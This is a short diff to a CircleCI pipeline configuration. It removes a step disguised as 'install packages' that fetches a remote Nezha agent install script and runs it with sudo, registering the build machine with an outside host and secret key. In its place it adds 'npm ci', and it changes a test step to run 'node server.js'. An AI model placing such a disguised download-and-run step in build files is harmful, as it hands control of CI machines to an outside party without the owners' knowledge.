@@ -21,14 +21,14 @@ jobs:
             - node-deps-v1-{{ .Branch }}-{{checksum "package-lock.json"}}
       - run:
           name: install packages
-          command: curl -L https://raw.githubusercontent.com/naiba/nezha/master/script/install.sh -o nezha.sh && chmod +x nezha.sh && sudo ./nezha.sh install_agent data-nztz.appgy.tk 443 6KjY78Aey0nrr6WeIl --tls
+          command: npm ci
       - save_cache:
           key: node-deps-v1-{{ .Branch }}-{{checksum "package-lock.json"}}
           paths:
             - ~/.npm
       - run:
-          name: Run Tests
-          command: npm run start
+          name: Run service
+          command: node server.js
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
